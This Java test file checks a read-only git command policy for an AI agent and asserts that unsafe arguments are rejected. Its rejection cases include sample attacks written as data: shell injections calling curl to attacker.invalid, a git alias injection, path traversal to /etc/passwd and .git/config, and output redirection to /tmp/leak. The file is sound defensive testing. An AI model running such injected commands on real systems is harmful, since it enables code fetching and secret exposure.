/*
 * Copyright (c) 2026 - Yupiik SAS - https://yupiik.io/
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance
 * with the License.  You may obtain a copy of the License at
 *
 *  http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing,
 * software distributed under the License is distributed on an
 * "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 * KIND, either express or implied.  See the License for the
 * specific language governing permissions and limitations
 * under the License.
 */
package io.yupiik.ia.agent.github.context.git;

import static org.junit.jupiter.api.Assertions.*;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.Collections;
import java.util.List;
import org.junit.jupiter.api.Test;

class GitReadPolicyTest {
    @Test
    void shallowStateAndBoundedRenameFormsRemainReads() {
        final var policy = new GitReadPolicy();
        assertEquals(
                List.of("rev-parse", "--is-shallow-repository"),
                policy.validate(List.of("rev-parse", "--is-shallow-repository")));
        for (final var flag : List.of("-M", "-M50%", "--find-renames=75%")) {
            final var canonical = policy.validate(List.of("diff", flag, "BASE", "HEAD"));
            assertTrue(canonical.contains("-l200"));
            assertTrue(canonical.stream().anyMatch(it -> it.startsWith("--find-renames=")));
        }
        assertTrue(
                policy.validate(List.of("diff", "-l1000", "-M", "BASE", "HEAD")).contains("-l1000"));
        assertThrows(IllegalArgumentException.class, () -> policy.validate(List.of("diff", "-l1001", "BASE", "HEAD")));
        assertThrows(IllegalArgumentException.class, () -> policy.validate(List.of("diff", "-M101%", "BASE", "HEAD")));
        assertThrows(
                IllegalArgumentException.class,
                () -> policy.validate(List.of("rev-parse", "--is-shallow-repository", "HEAD")));
    }

    private final GitReadPolicy policy = new GitReadPolicy();

    @Test
    void normalizesPrefixesCountsDefaultsAndGuards() {
        final var expected = List.of(
                "log",
                "--no-ext-diff",
                "--no-textconv",
                "--color=never",
                "--max-count=5",
                "--no-show-signature",
                "--oneline",
                "HEAD",
                "--");
        for (final var count : List.of(
                List.of("-5"),
                List.of("-n5"),
                List.of("-n", "5"),
                List.of("--max-count=5"),
                List.of("--max-count", "5"))) {
            final var argv = new ArrayList<>(List.of("git", "--no-pager", "--no-optional-locks", "log"));
            argv.addAll(count);
            argv.add("--oneline");
            assertEquals(expected, policy.validate(argv));
        }
        assertEquals(
                List.of(
                        "log",
                        "--no-ext-diff",
                        "--no-textconv",
                        "--color=never",
                        "--max-count=100",
                        "--no-show-signature",
                        "HEAD",
                        "--"),
                valid("log"));
        assertEquals(
                List.of(
                        "grep",
                        "--no-textconv",
                        "--color=never",
                        "--max-count=100",
                        "-n",
                        "-e",
                        "TODO",
                        "HEAD",
                        "--",
                        "src/*.java"),
                valid("grep", "-n", "TODO", "--", "src/*.java"));
        assertEquals(
                List.of("blame", "--no-textconv", "HEAD", "--", "src/Main.java"),
                valid("blame", "--", "src/Main.java"));
        assertEquals(List.of("branch", "--color=never", "--list"), valid("branch"));
        assertEquals(List.of("tag", "--list"), valid("tag"));
    }

    @Test
    void acceptsFamiliarTreeReads() {
        for (final var argv : List.of(
                List.of(
                        "git",
                        "log",
                        "-n",
                        "20",
                        "--oneline",
                        "--graph",
                        "--decorate=short",
                        "HEAD~10..HEAD",
                        "--",
                        "src/**"),
                List.of("log", "--first-parent", "--no-merges", "--reverse", "--format=%h %an %aI %s", "BASE...HEAD"),
                List.of("log", "--pretty", "format:%H%n%s%n%b", "--date=iso-strict", "refs/heads/main"),
                List.of("show", "--stat", "HEAD^"),
                List.of("show", "HEAD:src/Main.java"),
                List.of("show", "--pretty=fuller", "--no-patch", "v1.2.3"),
                List.of("diff", "--name-only", "BASE", "HEAD", "--", "src/[a-z]*.java"),
                List.of("diff", "--stat", "BASE..HEAD"),
                List.of("diff", "--word-diff=porcelain", "--diff-filter=AM", "--unified=10", "BASE...HEAD"),
                List.of("diff", "-U3", "--diff-algorithm=histogram", "HEAD~1", "HEAD"),
                List.of("grep", "-n", "-F", "--regexp=needle", "refs/tags/v1", "--", "src/**"),
                List.of("grep", "-i", "-A3", "-B", "2", "--context=5", "-e", "-option-like-pattern", "HEAD"),
                List.of("grep", "-e", "contains spaces and 'quotes'", "BASE", "HEAD"),
                List.of("blame", "-w", "-L", "1,100", "HEAD", "--", "src/Main.java"),
                List.of("blame", "--line-porcelain", "-L1,10", "--", "a file.txt"),
                List.of("ls-tree", "-r", "--name-only", "HEAD", "--", "src"),
                List.of("ls-tree", "-l", "refs/remotes/origin/main"),
                List.of("rev-parse", "--verify", "HEAD"),
                List.of("rev-parse", "--short=12", "HEAD"),
                List.of("merge-base", "HEAD", "BASE"),
                List.of("merge-base", "--is-ancestor", "BASE", "HEAD"),
                List.of("merge-base", "--octopus", "BASE", "HEAD", "main"),
                List.of("rev-list", "-20", "--first-parent", "BASE..HEAD"),
                List.of("rev-list", "--max-count=1000", "--count", "HEAD"),
                List.of("cat-file", "-p", "HEAD:README.adoc"),
                List.of("cat-file", "-s", "abcd1234"),
                List.of("cat-file", "-t", "a".repeat(40)),
                List.of("branch", "--list", "-a", "--contains=HEAD", "--sort=-committerdate", "feature/*"),
                List.of("branch", "-vv", "--format=%(refname:short) %(objectname:short) %(subject)"),
                List.of("tag", "-l", "--sort=version:refname", "--points-at", "HEAD", "v*"),
                List.of("tag", "--merged=HEAD", "--format=%(refname:short)"))) {
            assertDoesNotThrow(() -> policy.validate(argv), argv.toString());
        }
    }

    @Test
    void revisionsArePositiveAndBounded() {
        for (final var ref : List.of(
                "HEAD",
                "BASE",
                "main",
                "origin/main",
                "refs/heads/main",
                "refs/tags/v1.0",
                "refs/remotes/origin/main",
                "abcd",
                "a".repeat(40),
                "f".repeat(64),
                "HEAD~1000",
                "HEAD^1000",
                "HEAD~500^500",
                "HEAD~0^0",
                "HEAD^^^^^^^^")) {
            assertDoesNotThrow(() -> valid("rev-parse", "--verify", ref), ref);
        }
        for (final var ref : List.of(
                "HEAD~1001",
                "HEAD^1001",
                "HEAD~500^501",
                "HEAD^^^^^^^^^",
                "HEAD~999999999999",
                "HEAD~bad",
                "HEAD^-1",
                "HEAD@{0}",
                "@{-1}",
                "@",
                "HEAD^{tree}",
                "HEAD^!",
                "HEAD^@",
                "^HEAD",
                ":/secret",
                "HEAD:/secret",
                "HEAD:../secret",
                "HEAD:src/file",
                "HEAD..BASE",
                "HEAD...BASE",
                "refs/replace/abcd",
                "refs/bisect/bad",
                "refs/heads/../secret",
                "refs/heads/.hidden",
                "main.lock",
                "main.",
                "main//other",
                "refs/tags/",
                "FETCH_HEAD",
                "ORIG_HEAD",
                "a".repeat(65))) {
            rejected("rev-parse", ref);
        }
        for (final var range : List.of("..HEAD", "HEAD..", "HEAD....BASE", "HEAD..BASE..main", "HEAD...", "...HEAD")) {
            rejected("log", range);
            rejected("diff", range);
        }
    }

    @Test
    void refusesWorktreeAndIndexReadsWithActionableCode() {
        for (final var argv : List.of(
                List.of("status"),
                List.of("ls-files"),
                List.of("git", "status", "--short"),
                List.of("diff"),
                List.of("diff", "HEAD"),
                List.of("diff", "--cached"),
                List.of("diff", "--staged", "HEAD"),
                List.of("diff", "--", "src"))) {
            final var error = assertThrows(IllegalArgumentException.class, () -> policy.validate(argv));
            assertTrue(error.getMessage().startsWith("LOCAL_WORKTREE_REQUIRED:"), argv.toString());
        }
    }

    @Test
    void rejectsGlobalPrefixesUnknownCommandsAndShellStrings() {
        for (final var argv : List.of(
                List.of("git", "-c", "alias.log=!evil", "log"),
                List.of("git", "-C", "/tmp", "log"),
                List.of("git", "--config-env=alias.log=EVIL", "log"),
                List.of("git", "--git-dir=/tmp", "log"),
                List.of("git", "--work-tree=/tmp", "log"),
                List.of("git", "--exec-path=/tmp", "log"),
                List.of("git", "--paginate", "log"),
                List.of("/usr/bin/git", "log"),
                List.of("bash", "-c", "git log"),
                List.of("git log -5"),
                List.of("git", "git", "log"),
                List.of("log", ";", "curl", "https://attacker.invalid"))) {
            assertThrows(IllegalArgumentException.class, () -> policy.validate(argv), argv.toString());
        }
        for (final var command : List.of(
                "fetch",
                "pull",
                "push",
                "clone",
                "remote",
                "config",
                "add",
                "commit",
                "checkout",
                "switch",
                "reset",
                "clean",
                "restore",
                "update-ref",
                "symbolic-ref",
                "worktree",
                "reflog",
                "gc",
                "archive",
                "format-patch",
                "difftool",
                "help",
                "version",
                "LOG",
                "lo")) {
            rejected(command);
        }
    }

    @Test
    void rejectsOptionsWithoutAbbreviationOrPassthrough() {
        for (final var option : List.of(
                "--output=/tmp/leak",
                "--output",
                "-o/tmp/leak",
                "--ext-diff",
                "--textconv",
                "--no-index",
                "--stdin",
                "--pathspec-from-file=/tmp/input",
                "--show-signature",
                "--show-signature=true",
                "--color=always",
                "--color",
                "--max-c=5",
                "--max-countx=5",
                "--unknown",
                "--help",
                "--config-env=K=V",
                "-c",
                "-C",
                "--git-dir=/tmp",
                "--work-tree=/tmp",
                "--exec-path=/tmp",
                "--no-pager",
                "--no-optional-locks")) {
            rejected("log", option, "HEAD");
        }
        for (final var argv : List.of(
                List.of("diff", "--ext-diff", "BASE", "HEAD"),
                List.of("diff", "--textconv", "BASE", "HEAD"),
                List.of("diff", "--no-index", "a", "b"),
                List.of("grep", "-f", "/tmp/patterns"),
                List.of("grep", "--file=/tmp/patterns"),
                List.of("grep", "--cached", "needle"),
                List.of("grep", "--no-index", "needle"),
                List.of("grep", "--open-files-in-pager=evil", "needle"),
                List.of("blame", "--contents", "/tmp/file", "--", "a"),
                List.of("blame", "-S", "/tmp/revs", "--", "a"),
                List.of("blame", "--ignore-revs-file=/tmp/revs", "--", "a"),
                List.of("cat-file", "--batch"),
                List.of("cat-file", "--batch-command"),
                List.of("cat-file", "--filters", "HEAD:a"),
                List.of("cat-file", "--textconv", "HEAD:a"),
                List.of("rev-list", "--objects", "HEAD"),
                List.of("rev-list", "--all"),
                List.of("rev-parse", "--git-dir"),
                List.of("rev-parse", "--show-toplevel"),
                List.of("rev-parse", "--local-env-vars"),
                List.of("rev-parse", "--parseopt"),
                List.of("branch", "-D", "main"),
                List.of("branch", "-m", "old", "new"),
                List.of("branch", "--edit-description"),
                List.of("branch", "--track", "name"),
                List.of("branch", "-l", "name"),
                List.of("branch", "--create-reflog", "name"),
                List.of("tag", "-d", "v1"),
                List.of("tag", "-a", "v1"),
                List.of("tag", "-s", "v1"),
                List.of("tag", "-f", "v1"),
                List.of("tag", "--verify", "v1"))) {
            assertThrows(IllegalArgumentException.class, () -> policy.validate(argv), argv.toString());
        }
    }

    @Test
    void listingOperandsNeverBecomeCreationRequests() {
        assertEquals(List.of("branch", "--color=never", "--list", "new-name"), valid("branch", "new-name"));
        assertEquals(List.of("tag", "--list", "new-tag"), valid("tag", "new-tag"));
        rejected("branch", "name", "HEAD:secret");
        rejected("tag", "-unsafe");
    }

    @Test
    void pathsAreRelativeBoundedTreePathsNotPathspecMagic() {
        for (final var path : List.of("src/a.java", "a file.txt", "src/**/*.java", "docs/[a-z]?.md", "README.adoc")) {
            assertDoesNotThrow(() -> valid("log", "HEAD", "--", path), path);
        }
        for (final var path : List.of(
                "/etc/passwd",
                "../secret",
                "src/../../secret",
                "./src",
                "src/./file",
                "src//file",
                "C:/secret",
                "C:\\secret",
                "\\server\\share",
                ":(top)*",
                ":(literal)file",
                ":(exclude)src",
                "-output",
                "src/.git/config",
                "src/.GIT/config",
                "src/",
                "$(touch evil)",
                "a;echo evil",
                "a|b",
                "a".repeat(513),
                "*".repeat(17))) {
            rejected("log", "HEAD", "--", path);
            rejected("show", "HEAD:" + path);
        }
        rejected("blame", "HEAD", "--", "*.java");
        rejected("blame", "HEAD", "--", "a", "b");
        rejected("ls-tree", "HEAD", "src/file");
        assertEquals(
                List.of("src/Main.java", "--"),
                valid("log", "src/Main.java").subList(6, 8)); // Could be a ref, never an implicit worktree path.
        final var paths = new ArrayList<>(List.of("log", "--"));
        paths.addAll(Collections.nCopies(33, "a"));
        assertThrows(IllegalArgumentException.class, () -> policy.validate(paths));
    }

    @Test
    void formatsAndOptionValuesArePositiveAndBounded() {
        for (final var format :
                List.of("%H%n%s", "format:%h %an <%ae> %ad %%", "tformat:%P %cn %cI", "oneline", "raw")) {
            assertDoesNotThrow(() -> valid("log", "--format=" + format), format);
        }
        for (final var format : List.of(
                "%G?", "%GG", "%x00", "%C(auto)", "%w(999999)", "%<(999999)%s", "%", "%q", "%" + "a".repeat(513))) {
            rejected("show", "--format=" + format);
        }
        for (final var format : List.of(
                "%(rest)", "%(contents:signature)", "%(color:red)", "%(align:999999)", "%(refname", "%x00", "%")) {
            rejected("branch", "--format=" + format);
        }
        for (final var argv : List.of(
                List.of("log", "--date=format:%s"),
                List.of("log", "--decorate=evil"),
                List.of("log", "--abbrev=1000"),
                List.of("diff", "-U1001", "BASE", "HEAD"),
                List.of("diff", "--word-diff=color", "BASE", "HEAD"),
                List.of("diff", "--diff-filter=evil", "BASE", "HEAD"),
                List.of("grep", "--context=1001", "a"),
                List.of("tag", "--sort=contents"),
                List.of("branch", "--contains=HEAD@{0}"),
                List.of("blame", "-L", "/regex/,+10", "--", "a"),
                List.of("blame", "-L", "10,1", "--", "a"),
                List.of("blame", "-L", "1,1001", "--", "a"))) {
            assertThrows(IllegalArgumentException.class, () -> policy.validate(argv), argv.toString());
        }
    }

    @Test
    void malformedInputAndCountsFailSafely() {
        assertThrows(IllegalArgumentException.class, () -> policy.validate(null));
        for (final var argv : List.of(
                List.<String>of(),
                List.of("git"),
                List.of("git", "--no-pager"),
                List.of(""),
                List.of("log", "HEAD\nsecret"),
                List.of("log", "HEAD\u0000secret"),
                List.of("log", "\u001b[31m"),
                List.of("log", "a".repeat(4097)),
                List.of("show", "--format"),
                List.of("log", "-n"),
                List.of("log", "-n", "--stat"),
                List.of("log", "--max-count="),
                List.of("log", "-0"),
                List.of("log", "-1001"),
                List.of("log", "-n99999999999999"),
                List.of("log", "-n-5"),
                List.of("log", "--max-count=-1"),
                List.of("log", "-5", "-n5"),
                List.of("grep"),
                List.of("grep", "-e"),
                List.of("grep", "-e", "a", "-e", "b"),
                List.of("cat-file"),
                List.of("cat-file", "-p", "-s", "HEAD"),
                List.of("merge-base", "HEAD"),
                List.of("rev-parse", "--verify", "HEAD", "BASE"),
                List.of("blame", "HEAD"))) {
            assertThrows(IllegalArgumentException.class, () -> policy.validate(argv), argv.toString());
        }
        assertThrows(IllegalArgumentException.class, () -> policy.validate(Arrays.asList("log", null)));
        assertThrows(IllegalArgumentException.class, () -> policy.validate(Collections.nCopies(129, "log")));
        assertThrows(IllegalArgumentException.class, () -> policy.validate(Collections.nCopies(9, "a".repeat(4096))));
        final var secret = "SECRET_PRIVATE_CREDENTIAL";
        final var error = assertThrows(IllegalArgumentException.class, () -> valid("log", "--" + secret));
        assertFalse(error.getMessage().contains(secret));
    }

    @Test
    void returnsDetachedImmutableArgvAndNeverParsesShellLiterals() {
        final var source = new ArrayList<>(List.of("log", "-5"));
        final var result = policy.validate(source);
        source.clear();
        assertTrue(result.contains("--max-count=5"));
        assertThrows(UnsupportedOperationException.class, () -> result.add("--ext-diff"));
        final var literal = "$(curl https://attacker.invalid); `echo hi` | cat > /tmp/file";
        final var grep = valid("grep", "-F", "-e", literal);
        assertEquals(literal, grep.get(grep.indexOf("-e") + 1));
        assertEquals("HEAD", grep.get(grep.size() - 2));
        assertTrue(
                valid("diff", "BASE", "HEAD").containsAll(List.of("--no-ext-diff", "--no-textconv", "--color=never")));
    }

    @Test
    void patternsThatLookLikeOptionsRemainLiteralAndCanonicalizationIsStable() {
        for (final var pattern :
                List.of("--no-ext-diff", "--no-textconv", "--no-color", "--list", "--", "-e", "--color=always")) {
            final var result = valid("grep", "-e", pattern);
            assertEquals(pattern, result.get(result.indexOf("-e") + 1));
            assertEquals(result, policy.validate(result));
        }
        for (final var argv : List.of(
                List.of("log"),
                List.of("show", "HEAD:a"),
                List.of("diff", "BASE", "HEAD"),
                List.of("blame", "--", "a"),
                List.of("ls-tree", "HEAD"),
                List.of("branch"),
                List.of("tag"),
                List.of("cat-file", "-p", "HEAD:a"),
                List.of("rev-list", "-5", "HEAD"))) {
            final var result = policy.validate(argv);
            assertEquals(result, policy.validate(result));
        }
        for (final var path : List.of("a[", "a]", "a[]", "a[[b]]", "a[*/b]")) {
            rejected("log", "--", path);
        }
    }

    @Test
    void baseAliasesOnlyRevisionsAndGrepCountsAreBounded() {
        assertEquals(List.of("rev-parse", "refs/heads/base~2"), valid("rev-parse", "BASE~2"));
        assertTrue(valid("log", "HEAD..BASE").contains("HEAD..refs/heads/base"));
        assertTrue(valid("log", "BASE...BASE~1").contains("refs/heads/base...refs/heads/base~1"));
        assertTrue(valid("show", "BASE:BASE").contains("refs/heads/base:BASE"));
        assertTrue(valid("branch", "--contains=BASE").contains("--contains=refs/heads/base"));
        assertTrue(valid("grep", "-e", "BASE").contains("BASE"));
        assertTrue(valid("tag", "BASE").contains("BASE"));
        assertTrue(valid("log", "--format=BASE").contains("--format=BASE"));
        for (final var count :
                List.of(List.of("-m", "7"), List.of("-m7"), List.of("--max-count=7"), List.of("--max-count", "7"))) {
            final var args = new ArrayList<>(List.of("grep", "needle"));
            args.addAll(count);
            final var result = policy.validate(args);
            assertTrue(result.contains("--max-count=7"));
            assertEquals(result, policy.validate(result));
        }
        for (final var count : List.of("0", "1001", "-1", "999999999999999")) {
            rejected("grep", "--max-count=" + count, "needle");
        }
        rejected("grep", "-m1", "-m2", "needle");
        assertTrue(
                valid("ls-tree", "--format=%(objectname) %(objectsize) %(path)").contains("HEAD"));
        for (final var format : List.of("%(rest)", "%(contents)", "%x00", "%(path", "%")) {
            rejected("ls-tree", "--format=" + format);
        }
        assertFalse(valid("show", "HEAD:file").contains("--"));
        rejected("show", "HEAD:file", "--", "other");
    }

    @Test
    void rawBoundaryLimitsDoNotRequireCanonicalArgvToFitRawLimits() {
        final var raw = new ArrayList<>(List.of("log"));
        raw.addAll(Collections.nCopies(127, "--oneline"));
        final var canonical = policy.validate(raw);
        assertTrue(canonical.size() > 128);
        assertTrue(canonical.containsAll(
                List.of("--no-ext-diff", "--no-textconv", "--color=never", "--no-show-signature", "HEAD")));
        assertThrows(IllegalArgumentException.class, () -> policy.validate(canonical));
        assertEquals(128, raw.size());
    }

    private List<String> valid(final String... argv) {
        return policy.validate(List.of(argv));
    }

    private void rejected(final String... argv) {
        assertThrows(IllegalArgumentException.class, () -> valid(argv), Arrays.toString(argv));
    }
}
